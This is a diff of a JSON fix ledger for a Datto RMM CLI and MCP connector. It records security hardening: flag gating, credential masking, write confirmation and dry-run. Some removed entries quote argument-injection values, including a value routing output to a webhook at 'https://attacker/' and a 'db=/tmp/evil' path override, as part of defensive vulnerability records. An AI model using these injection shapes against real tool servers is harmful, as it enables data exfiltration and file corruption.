@@ -6,7 +6,7 @@
   {
    "id": "alert-uid-resource-id-override",
    "summary": "account-alerts-open / account-alerts-resolved key on `alert_uid` (the API's camelCase `alertUid`) in resourceIDFieldOverrides, in BOTH the sync extractor and the store extractor",
-   "why": "Datto RMM alert objects carry no id/uid/uuid/name/slug/key/code field -- `alertUid` is the only identifier (see internal/types.Alert). Every entry in genericIDFieldFallbacks therefore misses, and suffixIDFieldFallback cannot help either: it derives probes from the RESOURCE name (\"account-alerts-open\" -> \"account-alerts-open_id\"), never the \"alert\" stem, and matches by direct snake_case map lookup so it would never see camelCase `alertUid` regardless. Result before this override: sync consumed every alert and stored zero, emitting sync_anomaly all_items_failed_id_extraction (250/0), leaving local alert search and fleet analytics silently blind. Reported by @zendzipr in #258. The override map is duplicated in internal/cli/sync.go and internal/store/store.go -- both must carry it; fixing only one restores the silent drop.",
+   "why": "Datto RMM alert objects carry no id/uid/uuid/name/slug/key/code field -- `alertUid` is the only identifier (see internal/types.Alert). Every entry in genericIDFieldFallbacks therefore misses, and suffixIDFieldFallback cannot help either: it derives probes from the RESOURCE name (\"account-alerts-open\" -> \"account-alerts-open_id\"), never the \"alert\" stem, and matches by direct snake_case map lookup so it would never see camelCase `alertUid` regardless. Result before this override: sync consumed every alert and stored zero, emitting sync_anomaly all_items_failed_id_extraction (250/0), leaving local alert search and fleet analytics silently blind. Reported by @zendzipr in #258. The override map is duplicated in internal/cli/sync.go and internal/store/store.go -- both must carry it; fixing only one restores the silent drop. 4.34.2 reprint: now spec-encoded (x-resource-id alert_uid on the six alert list paths, tools/spec_fix.py), so the generator emits both override lines itself; the asserts still pin them.",
    "status": "active",
    "spec_encode_followup": "The durable fix is upstream: the press profiler should set IDField from the response-item schema when the item declares exactly one identifier-shaped field (`<stem>Uid`/`<stem>Id`) and no generic id. Filed as a /printing-press-retro item. Until the press emits it, or the Datto spec carries x-resource-id on /v2/account/alerts/{open,resolved}, this ledger entry is what survives a reprint.",
    "asserts": [
@@ -40,7 +40,8 @@
      "contains": "TestAlertOverridesMatchSyncResourceNames",
      "min_count": 1
     }
-   ]
+   ],
+   "spec_encoded": true
   },
   {
    "id": "doctor-verdict-tracks-reality",
@@ -53,7 +54,7 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
@@ -75,6 +76,36 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorUnexpectedStatus(authAPIErr.StatusCode, verifyPath, report)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -159,103 +190,66 @@
      "file": "mcp-install.md",
      "contains": "\"DATTO_RMM_TOKEN\":",
      "min_count": 3
-    }
-   ]
-  },
-  {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
+    },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
+     "file": "manifest.json",
+     "contains": "\"DATTO_RMM_MCP_READ_ONLY\": \"${user_config.datto_rmm_mcp_read_only}\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
+     "file": "server.json",
+     "contains": "\"name\": \"DATTO_RMM_MCP_READ_ONLY\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
+     "file": "mcp-install.md",
+     "contains": "\"DATTO_RMM_MCP_READ_ONLY\":",
+     "min_count": 3
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"DATTO_RMM_NO_LOCAL_DATA\": \"${user_config.datto_rmm_no_local_data}\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
+     "file": "server.json",
+     "contains": "\"name\": \"DATTO_RMM_NO_LOCAL_DATA\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
+     "file": "mcp-install.md",
+     "contains": "\"DATTO_RMM_NO_LOCAL_DATA\":",
+     "min_count": 3
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"DATTO_RMM_MCP_HTTP_TOKEN\": \"${user_config.datto_rmm_mcp_http_token}\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
+     "file": "server.json",
+     "contains": "\"name\": \"DATTO_RMM_MCP_HTTP_TOKEN\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
+     "file": "mcp-install.md",
+     "contains": "\"DATTO_RMM_MCP_HTTP_TOKEN\":",
+     "min_count": 3
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"DATTO_RMM_USER_AGENT\": \"${user_config.datto_rmm_user_agent}\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
+     "file": "server.json",
+     "contains": "\"name\": \"DATTO_RMM_USER_AGENT\"",
      "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
-     "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
+     "file": "mcp-install.md",
+     "contains": "\"DATTO_RMM_USER_AGENT\":",
+     "min_count": 3
     }
    ]
   },
@@ -426,251 +420,915 @@
    ]
   },
   {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "secret-echo-decoded-funnel",
+   "id": "no-response-cache",
    "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown). Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
+   "summary": "The on-disk response cache is off on every client: raw Datto bodies never sit in cache files.",
+   "why": "Work order: nothing but the credential store holds a credential. c.NoCache = true in guardClient (datto_guard.go); TestGuardWrapsTheSessionTransport asserts it. README and SKILL say responses are never cached (tools/apply_docfixes.py). Ported to datto from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to datto-rmm from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
    "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
    "asserts": [
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
-     "min_count": 1,
+     "file": "cli/internal/cli/credkit_client.go",
+     "contains": "c.NoCache = true",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "store-never-keeps-secrets",
+   "class": "secret-echo",
+   "summary": "Every resource write passes mergeIncomingResourceData, which replaces the fields the connector declares as response credentials (a site proxy password, a reset API key pair, a token) with [redacted] at any depth, so one such site never makes the kit refuse a statement and fail the sync; every SQL write passes the credential kit through a database/sql driver, which refuses a statement carrying any other held value.",
+   "why": "Work order: no credential in files. store.go carries 4 lines re-applied by tools/apply_credential_rules.py; Open uses WithholdingSQLiteDriver (hand file internal/store/datto_withhold_driver.go, from the cisco-umbrella Codex r1 class store-write-bypasses-chokepoint). The class credential-split-across-sql-bindings is left to the fleet credential filter the publish step adopts (orchestrator ruling 2026-10-27). Covered by TestNoCredentialInAnyWrittenFile (.db files scanned) and TestStoreRedactsCredentialNamedValuesNotHeld. Ported to datto from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to datto-rmm from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "return withoutStoredSecrets(s.mergeIncomingResourceDataRaw(tx, resourceType, id, incoming))",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/store/store.go",
+     "contains": "db, err := sql.Open(KitSQLiteDriver, dsn)",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
-     "min_count": 1,
+     "file": "cli/internal/store/datto_secrets.go",
+     "contains": "func withoutStoredSecrets(data json.RawMessage) json.RawMessage {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
+     "file": "cli/internal/store/datto_replace.go",
+     "contains": "withoutStoredSecrets(data)",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
+     "file": "cli/internal/credwire/classes_test.go",
+     "contains": "func TestSyncOfASiteWithAProxyPasswordCompletes(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
-     "min_count": 1,
+     "file": "cli/internal/credwire/classes_test.go",
+     "contains": "func TestDeclarationCopiesMatch(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-mirror-write-confirm",
+   "class": "write-safety",
+   "summary": "No MCP tool changes Datto state: every endpoint tool is a GET marked read-only and every mirrored command is read-only or writes only the CLI's own files. The confirm gate stays installed so a mirrored command a later print adds that is neither read-only nor local previews and sends only with confirm: true.",
+   "why": "Work order: an MCP write previews and sends only with confirm: true. RequireConfirmForMirroredWrites (hand file internal/mcp/cobratree/datto_confirm.go), called from RegisterTools after RegisterAll. TestRegisteredMirroredWritesNeedConfirm fails on any registered tool that is not read-only, not on its local list and has no confirm gate; TestMCPSendsOnlyReads (black-box) checks a full MCP battery sends only GETs and the two logins. Ported to datto from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to datto-rmm from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "cobratree.RequireConfirmForMirroredWrites(s, cli.RootCmd(), cobratree.CachedSiblingCLIPath)",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "c.maskCredentialText(truncateBody(respBody), authHeader)"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
-     "min_count": 1,
+     "file": "cli/internal/mcp/cobratree/datto_confirm.go",
+     "contains": "func RequireConfirmForMirroredWrites(",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
-     "min_count": 1,
+     "file": "cli/internal/mcp/datto_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
-     "min_count": 1,
+     "file": "cli/internal/credwire/mcp_confirm_test.go",
+     "contains": "func TestMCPMirroredWritesPreview(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "docs-credential-safety",
+   "class": "docs",
+   "summary": "README and SKILL carry a Credential safety section (which host gets which credential, withheld output, 0600 store, dry run, MCP confirm) and no longer promise a five-minute response cache (the cache is off on every client).",
+   "why": "The generated docs describe the press defaults (a response cache) that the credential layer turns off; a reprint restores the false promise and drops the transcripts reasoning the work order requires. Ported to datto from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to datto-rmm from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "guide.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "cached for five minutes"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "cached for five minutes"
+    }
+   ]
+  },
+  {
+   "id": "dry-run-sends-nothing",
+   "status": "active",
+   "summary": "A client built under --dry-run refuses every request at its transport, so no write, mint or refresh can reach Datto whatever a command does with the client; `auth login --dry-run` sends nothing too.",
+   "why": "Defense in depth beside dry-run-never-mints: the generated preview path returns before sending, and this transport makes a missed branch fail closed. The black-box test runs writes and auth login under --dry-run from a cold start against a fake token host and API host and counts zero requests on both. Ported to datto from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to datto-rmm from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/credkit_client.go",
+     "contains": "c.HTTPClient.Transport = config.OutboundGuard(dryRunTripper{})",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/credwire/dryrun_test.go",
+     "contains": "func TestDryRunSendsNothing(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-endpoint-write-confirm",
+   "status": "active",
+   "summary": "Every typed MCP endpoint tool that is not read-only (create or update a company or contact, delete a contact, create an order, update or cancel a subscription) returns a preview of the request and sends nothing until confirm is boolean true; the gate wraps every non-read-only, non-mirrored tool, so one a later print adds is gated too.",
+   "why": "Work order connector note: every MCP write must preview and send only with confirm: true. Press 4.34.2's in-process endpoint handlers (makeAPIHandler) send writes directly. The gate (hand file internal/mcp/datto_endpoint_confirm.go) is installed by one anchored line in the generated tools.go after every registration and before the read-only drop. The black-box test drives the real MCP server against a fake Datto: no write without confirm, the string \"true\" previews, and boolean true sends (control). Ported to datto from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to datto from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to datto-rmm from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "RequireConfirmForEndpointWrites(s)",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
-     "min_count": 1,
+     "file": "cli/internal/mcp/datto_endpoint_confirm.go",
+     "contains": "func RequireConfirmForEndpointWrites(s *server.MCPServer) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/mcp/datto_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
